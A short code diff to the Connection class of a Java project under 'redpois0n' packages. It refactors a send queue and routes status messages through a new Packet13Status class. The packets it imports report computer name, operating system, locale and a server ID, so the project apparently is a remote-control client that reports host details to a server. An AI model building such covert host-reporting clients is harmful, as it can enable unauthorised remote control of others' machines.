@@ -17,10 +17,9 @@ import com.redpois0n.common.codec.Hex;
 import com.redpois0n.common.crypto.Crypto;
 import com.redpois0n.common.io.StringWriter;
 import com.redpois0n.packets.incoming.AbstractIncomingPacket;
-import com.redpois0n.packets.incoming.PacketBuilder;
 import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;
-import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.packets.outgoing.Packet10InitDefaultLocale;
+import com.redpois0n.packets.outgoing.Packet13Status;
 import com.redpois0n.packets.outgoing.Packet14InitComputerName;
 import com.redpois0n.packets.outgoing.Packet15InitServerID;
 import com.redpois0n.packets.outgoing.Packet16InitOperatingSystem;
@@ -167,7 +166,7 @@ public class Connection implements Runnable {
 		packet.send(dos, sw);
 	}
 
-	public static void addToSendQueue(PacketBuilder packet) {
+	/*public static void addToSendQueue(PacketBuilder packet) {
 		while (lock) {
 			try {
 				Thread.sleep(10L);
@@ -180,7 +179,7 @@ public class Connection implements Runnable {
 	
 	public static void write(Header header) {
 		addToSendQueue(new PacketBuilder(header));
-	}
+	}*/
 
 	public static void writeLine(String s) {
 		try {
@@ -274,11 +273,11 @@ public class Connection implements Runnable {
 	}
 
 	public static void status(String status) {
-		// TODO addToSendQueue(new PacketBuilder(Header.STAT, status));
+		addToSendQueue(new Packet13Status(status));
 	}
 
 	public static void status(int status) {
-		// TODO addToSendQueue(new PacketBuilder(Header.STAT, status + ""));
+		addToSendQueue(new Packet13Status(status + ""));
 	}
 
 	public static void lock() {
